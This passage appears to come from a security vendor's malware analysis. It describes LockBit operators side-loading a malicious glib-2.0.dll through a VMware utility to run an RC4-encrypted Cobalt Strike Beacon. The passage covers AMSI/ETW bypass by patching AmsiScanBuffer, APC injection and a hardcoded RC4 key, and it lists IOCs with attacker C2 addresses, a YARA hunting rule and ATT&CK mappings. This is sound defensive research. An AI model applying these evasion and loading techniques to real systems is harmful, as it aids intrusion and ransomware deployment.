                        "<a_0xb9f097e2>": "https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
                        "<code_0xa54a853f>": "AmsiScanBuffer"
                    },
                    "text": "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process.",
                    "html": "<p><a href=\"https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal\" rel=\"noopener noreferrer\" target=\"_blank\">AMSI</a> is bypassed the same way as ETW through patching <code>AmsiScanBuffer</code>. This halts AMSI from inspecting potentially suspicious buffers within this process.</p>"
                },
                {
                    "id": "<sentence_0x5ee2dfe2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa96020fe>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/GSHandlerCheck.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "AMSI bypass",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65962\"><img alt=\"\" class=\"size-full wp-image-65962\" height=\"1144\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/GSHandlerCheck.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"948\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65962\">AMSI bypass</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x44930cb7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9d0c882f>": "c0000015.log"
                    },
                    "text": "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                    "html": "<p>Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned <code>c0000015.log</code> file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.</p>"
                },
                {
                    "id": "<sentence_0x9007e85a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V[",
                    "html": "\n&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'\n$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D\nHERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'\n4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V[\n"
                },
                {
                    "id": "<sentence_0x87de2ebf>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf161a452>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/key.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "RC4 Key Scheduling Algorithm",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65971\"><img alt=\"\" class=\"size-full wp-image-65971\" height=\"492\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/key.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1034\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65971\">RC4 Key Scheduling Algorithm</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xf1ef8ca>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The RC4 decryption of the payload then commences.",
                    "html": "<p>The RC4 decryption of the payload then commences.</p>"
                },
                {
                    "id": "<sentence_0x8ee37a59>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x28df2811>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/APC-payload.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "RC4 decryption routine",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65963\"><img alt=\"\" class=\"size-full wp-image-65963\" height=\"838\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/APC-payload.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1190\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65963\">RC4 decryption routine</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x986204b6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The final result is Beacons Reflective Loader, seen below with the familiar magic bytes and hardcoded strings.",
                    "html": "<p>The final result is Beacon\u2019s Reflective Loader, seen below with the familiar magic bytes and hardcoded strings.</p>"
                },
                {
                    "id": "<sentence_0x9dbf3374>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf0189908>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/DOS-Magic.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"aligncenter size-full wp-image-65969\" height=\"406\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/DOS-Magic.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1158\"/></p>"
                },
                {
                    "id": "<sentence_0x1ab0672b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x7b508108>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/beacon.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Decrypted Cobalt Strike Beacon Reflective Loader",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65956\"><img alt=\"\" class=\"size-full wp-image-65956\" height=\"434\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/beacon.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1152\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65956\">Decrypted Cobalt Strike Beacon Reflective Loader</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xb8dbfa3d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within.",
                    "html": "<p>Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within.</p>"
                },
                {
                    "id": "<sentence_0xe81d60ad>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC.",
                    "html": "<p>This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created thread\u2019s APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC.</p>"
                },
                {
                    "id": "<sentence_0x6f202e38>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xacd7c6b0>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/createFile.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Logic to queue and execute user-mode APC",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65967\"><img alt=\"\" class=\"size-full wp-image-65967\" height=\"744\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/createFile.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1256\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65967\">Logic to queue and execute user-mode APC</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xa5fbd844>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The DLL is detected by the SentinelOne agent prior to being loaded and executed.",
                    "html": "<p>The DLL is detected by the SentinelOne agent prior to being loaded and executed.</p>"
                },
                {
                    "id": "<sentence_0x3bfece87>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x7af80a75>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/static-detection-of-LockBit.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Detection for LockBit DLL",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65957\"><img alt=\"\" class=\"size-full wp-image-65957\" height=\"835\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/static-detection-of-LockBit.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1999\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65957\">Detection for LockBit DLL</figcaption></figure>"
                }
            ]
        },
        {
            "id": "<chapter_0x4cd7d77>",
            "title": "VMware Side-loading Variants",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x9dbee16e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt.",
                    "html": "<p>A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt.</p>"
                },
                {
                    "id": "<sentence_0xd874e25a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x21704928>": "vmtools.ini",
                        "<code_0x476096f1>": "c0000015.log"
                    },
                    "text": "For example, several of the samples attempt to load the file vmtools.ini rather than c0000015.log.",
                    "html": "<p>For example, several of the samples attempt to load the file <code>vmtools.ini</code> rather than <code>c0000015.log</code>.</p>"
                },
                {
                    "id": "<sentence_0x1c838462>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60b4a118>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/flags.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "The vmtools.ini file being accessed by a variant",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65960\"><img alt=\"\" class=\"size-full wp-image-65960\" height=\"358\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/flags.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1020\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65960\">The vmtools.ini file being accessed by a variant</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x6f8a6205>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x55b5b2f0>": "vmtools.ini"
                    },
                    "text": "Another variant shares the same file name to load vmtools.ini, yet is packed with a custom version of UPX.",
                    "html": "<p>Another variant shares the same file name to load <code>vmtools.ini</code>, yet is packed with a custom version of UPX.</p>"
                },
                {
                    "id": "<sentence_0xd70c953c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x6d868010>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp-to-unpacked-code.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Tail jump at the end of the UPX unpacking stub",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65965\"><img alt=\"\" class=\"size-full wp-image-65965\" height=\"1010\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp-to-unpacked-code.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1524\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65965\">Tail jump at the end of the UPX unpacking stub</figcaption></figure>"
                }
            ]
        },
        {
            "id": "<chapter_0x63c020f5>",
            "title": "Conclusion",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x30d6803>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xccbaf706>": "VMwareXferlogs.exe",
                        "<code_0xe689a908>": "glib-2.0.dll",
                        "<code_0xc210cc5d>": "g_path_get_basename()",
                        "<code_0x8b79cc36>": "ExitProcess()"
                    },
                    "text": "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                    "html": "<p>The VMware command line utility <code>VMwareXferlogs.exe</code> used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate <code>glib-2.0.dll</code> to only have code within the <code>g_path_get_basename()</code> function, while all other exports simply called <code>ExitProcess()</code>. This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.</p>"
                },
                {
                    "id": "<sentence_0xb1544830>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.",
                    "html": "<p>LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x54cb4b29>",
            "title": "Indicators of Compromise",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x6593eff2>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xb51aa4a9>": {
                            "0": {
                                "0": "SHA1",
                                "1": "729eb505c36c08860c4408db7be85d707bdcbf1b",
                                "2": "091b490500b5f827cc8cde41c9a7f68174d11302",
                                "3": "e35a702db47cb11337f523933acd3bce2f60346d",
                                "4": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223",
                                "5": "0c842d6e627152637f33ba86861d74f358a85e1f",
                                "6": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                            },
                            "1": {
                                "0": "Description",
                                "1": "Malicious glib-2.0.dll from investigation",
                                "2": "Decrypted Cobalt Strike payload",
                                "3": "Encrypted Cobalt Strike payload \u2013 c0000015.log",
                                "4": "glib-2.0.dll vmtools.ini variant",
                                "5": "glib-2.0.dll vmtools.ini variant",
                                "6": "glib-2.0.dll UPX-packed vmtools.ini variant"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>SHA1</td>\n<td>Description</td>\n</tr>\n<tr>\n<td>729eb505c36c08860c4408db7be85d707bdcbf1b</td>\n<td>Malicious glib-2.0.dll from investigation</td>\n</tr>\n<tr>\n<td>091b490500b5f827cc8cde41c9a7f68174d11302</td>\n<td>Decrypted Cobalt Strike payload</td>\n</tr>\n<tr>\n<td>e35a702db47cb11337f523933acd3bce2f60346d</td>\n<td>Encrypted Cobalt Strike payload \u2013 c0000015.log</td>\n</tr>\n<tr>\n<td>25fbfa37d5a01a97c4ad3f0ee0396f953ca51223</td>\n<td>glib-2.0.dll vmtools.ini variant</td>\n</tr>\n<tr>\n<td>0c842d6e627152637f33ba86861d74f358a85e1f</td>\n<td>glib-2.0.dll vmtools.ini variant</td>\n</tr>\n<tr>\n<td>1458421f0a4fe3acc72a1246b80336dc4138dd4b</td>\n<td>glib-2.0.dll UPX-packed vmtools.ini variant</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0xc2b2aefc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xed265174>": {
                            "0": {
                                "0": "File Path",
                                "1": "c:\\windows\\debug\\VMwareXferlogs.exe",
                                "2": "c:\\windows\\debug\\glib-2.0.dll",
                                "3": "c:\\windows\\debug\\c0000015.log"
                            },
                            "1": {
                                "0": "Description",
                                "1": "Full path to legitimate VMware command line utility",
                                "2": "Malicious DLL used for hijack",
                                "3": "Encrypted Cobalt Strike reflective loader"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>File Path</td>\n<td>Description</td>\n</tr>\n<tr>\n<td>c:\\windows\\debug\\VMwareXferlogs.exe</td>\n<td>Full path to legitimate VMware command line utility</td>\n</tr>\n<tr>\n<td>c:\\windows\\debug\\glib-2.0.dll</td>\n<td>Malicious DLL used for hijack</td>\n</tr>\n<tr>\n<td>c:\\windows\\debug\\c0000015.log</td>\n<td>Encrypted Cobalt Strike reflective loader</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x530528b>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x42fd0e69>": {
                            "0": {
                                "0": "C2",
                                "1": "149.28.137[.]7",
                                "2": "45.32.108[.]54"
                            },
                            "1": {
                                "0": "Description",
                                "1": "Cobalt Strike C2",
                                "2": "Attacker C2"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>C2</td>\n<td>Description</td>\n</tr>\n<tr>\n<td>149.28.137[.]7</td>\n<td>Cobalt Strike C2</td>\n</tr>\n<tr>\n<td>45.32.108[.]54</td>\n<td>Attacker C2</td>\n</tr>\n</tbody>\n</table>"
                }
            ]
        },
        {
            "id": "<chapter_0xbcd18ef4>",
            "title": "YARA Hunting Rules",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xf046d69>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "import \"pe\"<crlf>rule Weaponized_glib2_0_dll<crlf>{<crlf>meta:<crlf>description = \"Identify potentially malicious versions of glib-2.0.dll\"<crlf>author = \"James Haughom @ SentinelOne\"<crlf>date = \"2022-04-22\"<crlf>reference = \"https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/\"<crlf>/*<crlf>The VMware command line utilty 'VMwareXferlogs.exe' used for data<crlf>transfer to/from VMX logs is susceptible to DLL sideloading. The<crlf>malicious versions of this DLL typically only have code within<crlf>the function 'g_path_get_basename()' properly defined, while the<crlf>rest will of the exports simply call 'ExitProcess()'. Notice how<crlf>in the exports below, the virtual address for all exported functions<crlf>are the same except for 'g_path_get_basename()'. We can combine this<crlf>along with an anomalously low number of exports for this DLL, as<crlf>legit instances of this DLL tend to have over 1k exports.<crlf>[Exports]<crlf>nth paddr vaddr bind type size lib name<crlf><crlf>1 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_error_free<crlf>2 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_free<crlf>3 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_add_main_entries<crlf>4 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_free<crlf>5 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_get_help<crlf>6 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_new<crlf>7 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_parse<crlf>8 0x00001820 0x180002420 GLOBAL FUNC 0 glib-2.0.dll g_path_get_basename<crlf>9 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_print<crlf>10 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_printerr<crlf>11 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_set_prgname<crlf>This rule will detect malicious versions of this DLL by identifying<crlf>if the virtual address is the same for all of the exported functions<crlf>used by 'VMwareXferlogs.exe' except for 'g_path_get_basename()'.<crlf>*/<crlf>condition:<crlf>/* sample is an unsigned DLL */<crlf>pe.characteristics & pe.DLL and pe.number_of_signatures == 0 and<crlf>/* ensure that we have all of the exported functions of glib-2.0.dll imported by VMwareXferlogs.exe */<crlf>pe.exports(\"g_path_get_basename\") and<crlf>pe.exports(\"g_error_free\") and<crlf>pe.exports(\"g_free\") and<crlf>pe.exports(\"g_option_context_add_main_entries\") and<crlf>pe.exports(\"g_option_context_get_help\") and<crlf>pe.exports(\"g_option_context_new\") and<crlf>pe.exports(\"g_print\") and<crlf>pe.exports(\"g_printerr\") and<crlf>pe.exports(\"g_set_prgname\") and<crlf>pe.exports(\"g_option_context_free\") and<crlf>pe.exports(\"g_option_context_parse\") and<crlf>/* all exported functions have the same offset besides g_path_get_basename */<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_error_free\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_get_help\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_new\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_add_main_entries\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_print\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_printerr\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_set_prgname\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_free\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_parse\")].offset and<crlf>pe.export_details[pe.exports_index(\"g_free\")].offset != pe.export_details[pe.exports_index(\"g_path_get_basename\")].offset and<crlf>/* benign glib-2.0.dll instances tend to have ~1k exports while malicious ones have the bare minimum */<crlf>pe.number_of_exports < 15<crlf>}",
                    "html": "\nimport \"pe\"\nrule Weaponized_glib2_0_dll\n{\n\tmeta:\n\t\tdescription = \"Identify potentially malicious versions of glib-2.0.dll\"\n\t\tauthor = \"James Haughom @ SentinelOne\"\n\t\tdate = \"2022-04-22\"\n\t\treference = \"https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/\"\n\t/*\n\t\tThe VMware command line utilty 'VMwareXferlogs.exe' used for data\n\t\ttransfer to/from VMX logs is susceptible to DLL sideloading. The\n\t\tmalicious versions of this DLL typically only have code within \n\t\tthe function 'g_path_get_basename()' properly defined, while the\n\t\trest will of the exports simply call 'ExitProcess()'. Notice how\n\t\tin the exports below, the virtual address for all exported functions\n\t\tare the same except for 'g_path_get_basename()'. We can combine this\n\t\talong with an anomalously low number of exports for this DLL, as\n\t\tlegit instances of this DLL tend to have over 1k exports.\n\t\t[Exports]\n\t\tnth paddr vaddr bind type size lib name\n\t\t\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\n\t\t1 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_error_free\n\t\t2 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_free\n\t\t3 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_add_main_entries\n\t\t4 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_free\n\t\t5 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_get_help\n\t\t6 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_new\n\t\t7 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_parse\n\t\t8 0x00001820 0x180002420 GLOBAL FUNC 0 glib-2.0.dll g_path_get_basename\n\t\t9 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_print\n\t\t10 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_printerr\n\t\t11 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_set_prgname\n\t\tThis rule will detect malicious versions of this DLL by identifying\n\t\tif the virtual address is the same for all of the exported functions\n\t\tused by 'VMwareXferlogs.exe' except for 'g_path_get_basename()'.\n\t*/\n\tcondition:\n\t\t/* sample is an unsigned DLL */\n\t\tpe.characteristics & pe.DLL and pe.number_of_signatures == 0 and\n\t\t/* ensure that we have all of the exported functions of glib-2.0.dll imported by VMwareXferlogs.exe */\n\t\tpe.exports(\"g_path_get_basename\") and\n\t\tpe.exports(\"g_error_free\") and\n\t\tpe.exports(\"g_free\") and\n\t\tpe.exports(\"g_option_context_add_main_entries\") and\n\t\tpe.exports(\"g_option_context_get_help\") and\n\t\tpe.exports(\"g_option_context_new\") and\n\t\tpe.exports(\"g_print\") and\n\t\tpe.exports(\"g_printerr\") and\n\t\tpe.exports(\"g_set_prgname\") and\n\t\tpe.exports(\"g_option_context_free\") and\n\t\tpe.exports(\"g_option_context_parse\") and\n\t\t/* all exported functions have the same offset besides g_path_get_basename */\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_error_free\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_get_help\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_new\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_add_main_entries\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_print\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_printerr\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_set_prgname\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_free\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset == pe.export_details[pe.exports_index(\"g_option_context_parse\")].offset and\n\t\tpe.export_details[pe.exports_index(\"g_free\")].offset != pe.export_details[pe.exports_index(\"g_path_get_basename\")].offset and\n\t\t/* benign glib-2.0.dll instances tend to have ~1k exports while malicious ones have the bare minimum */\n\t\tpe.number_of_exports < 15\n}\n"
                }
            ]
        },
        {
            "id": "<chapter_0xf08b4689>",
            "title": "MITRE ATT&CK TTPs",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xf2d58d55>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xdbf495dc>": "https://attack.mitre.org/techniques/T1027/",
                        "<a_0xa3859a29>": "https://attack.mitre.org/techniques/T1574/",
                        "<a_0x43135bf5>": "https://attack.mitre.org/techniques/T1562/002/",
                        "<a_0x669f0f56>": "https://attack.mitre.org/techniques/T1562/001/",
                        "<a_0x932b9543>": "https://attack.mitre.org/techniques/T1027/002/",
                        "<a_0xac716cc5>": "https://attack.mitre.org/techniques/T1059/001/",
                        "<a_0xb228959c>": "https://attack.mitre.org/software/S0154/",
                        "<table_0xd824826f>": {
                            "0": {
                                "0": "TTP",
                                "1": "Encrypted Cobalt Strike payload",
                                "2": "DLL Hijacking",
                                "3": "ETW Bypass",
                                "4": "AMSI Bypass",
                                "5": "Unhooking EDR",
                                "6": "Encrypted payload",
                                "7": "Powershell usage",
                                "8": "Cobalt Strike"
                            },
                            "1": {
                                "0": "MITRE ID",
                                "1": "T1027",
                                "2": "T1574",
                                "3": "T1562.002",
                                "4": "T1562.002",
                                "5": "T1562.001",
                                "6": "T1027.002",
                                "7": "T1059.001",
                                "8": "S0154"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>TTP</td>\n<td>MITRE ID</td>\n</tr>\n<tr>\n<td>Encrypted Cobalt Strike payload</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1027/\" rel=\"noopener noreferrer\" target=\"_blank\">T1027</a></td>\n</tr>\n<tr>\n<td>DLL Hijacking</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1574/\" rel=\"noopener noreferrer\" target=\"_blank\">T1574</a></td>\n</tr>\n<tr>\n<td>ETW Bypass</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1562/002/\" rel=\"noopener noreferrer\" target=\"_blank\">T1562.002</a></td>\n</tr>\n<tr>\n<td>AMSI Bypass</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1562/002/\" rel=\"noopener noreferrer\" target=\"_blank\">T1562.002</a></td>\n</tr>\n<tr>\n<td>Unhooking EDR</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1562/001/\" rel=\"noopener noreferrer\" target=\"_blank\">T1562.001</a></td>\n</tr>\n<tr>\n<td>Encrypted payload</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1027/002/\" rel=\"noopener noreferrer\" target=\"_blank\">T1027.002</a></td>\n</tr>\n<tr>\n<td>Powershell usage</td>\n<td><a href=\"https://attack.mitre.org/techniques/T1059/001/\" rel=\"noopener noreferrer\" target=\"_blank\">T1059.001</a></td>\n</tr>\n<tr>\n<td>Cobalt Strike</td>\n<td><a href=\"https://attack.mitre.org/software/S0154/\" rel=\"noopener noreferrer\" target=\"_blank\">S0154</a></td>\n</tr>\n</tbody>\n</table>"
                }
            ]
        }
    ]
}